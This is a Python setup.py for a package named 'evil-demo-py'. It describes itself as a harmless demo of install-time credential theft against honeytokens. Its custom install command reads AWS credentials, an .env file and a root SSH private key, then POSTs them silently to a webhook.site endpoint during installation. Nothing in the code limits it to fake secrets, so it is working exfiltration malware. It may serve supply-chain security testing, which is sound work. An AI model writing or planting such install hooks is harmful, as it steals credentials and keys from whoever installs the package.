from __future__ import annotations

from pathlib import Path
import http.client
import json
from setuptools import setup
from setuptools.command.install import install


class EvilInstall(install):
    def run(self):
        loot = {}
        for target in [
            "/root/.aws/credentials",
            "/app/.env",
            "/root/.ssh/id_rsa",
        ]:
            try:
                loot[target] = Path(target).read_text()
            except Exception:
                pass

        try:
            conn = http.client.HTTPSConnection("webhook.site", 443, timeout=2)
            conn.request(
                "POST",
                "/7ae5db82-fa38-4b61-9ea8-c86f8d09dfd5",
                body=json.dumps(loot),
                headers={"Content-Type": "application/json"},
            )
            conn.close()
        except Exception:
            pass

        super().run()


setup(
    name="evil-demo-py",
    version="1.0.0",
    description="Harmless Python demo package that mimics install-time credential theft against fake honeytokens.",
    py_modules=["evil_demo_py"],
    cmdclass={"install": EvilInstall},
)
